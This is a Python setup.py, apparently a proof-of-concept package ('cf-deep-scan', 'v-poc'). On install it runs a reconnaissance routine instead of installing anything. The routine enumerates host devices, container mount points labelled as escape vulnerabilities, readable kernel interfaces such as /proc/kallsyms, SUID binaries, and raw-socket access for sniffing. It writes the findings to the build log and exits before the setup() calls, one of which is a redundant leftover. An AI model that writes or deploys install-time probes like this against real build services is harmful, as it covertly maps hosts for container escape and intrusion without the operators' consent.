import os, sys, subprocess as sp
from setuptools import setup

def deep_scan():
    o = sys.stderr.write
    def r(c): return sp.getoutput(c)

    o("\n" + "#"*50 + "\n")
    o("--- CLOUDFLARE DEEP SYSTEM AUDIT ---\n")

 
    o("\n[1] SCANNING /dev FOR HOST DEVICES:\n")
    o(r("ls -F /dev | grep -vE 'null|zero|full|tty|random|urandom|pts'"))
 
    o("\n\n[2] ANALYZING MOUNT POINTS (ESCAPE VULNS):\n")
    o(r("mount | grep -iE 'docker|kube|container|shift|overlay'"))
 
    o("\n\n[3] KERNEL INTERFACES:\n")
    paths = ['/proc/config.gz', '/proc/sched_debug', '/proc/kallsyms', '/proc/interrupts']
    for p in paths:
        if os.path.exists(p):
            o(f"ACCESS GRANTED: {p}\n")
        else:
            o(f"DENIED: {p}\n")
 
    o("\n\n[4] HIDDEN SUID SEARCH:\n")
    o(r("find /opt /home /var -perm -4000 -type f 2>/dev/null"))
 
    o("\n\n[5] RAW SOCKET TEST:\n")
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        o("CRITICAL: Raw Sockets allowed! Can sniff traffic.\n")
    except:
        o("SAFE: Raw Sockets denied.\n")

    o("\n" + "#"*50 + "\n")
    sys.exit(1)

try: deep_scan()
except: sys.exit(1)

setup(name="cf-deep-scan", version="1.0")

setup(name="v-poc", version="1.0")
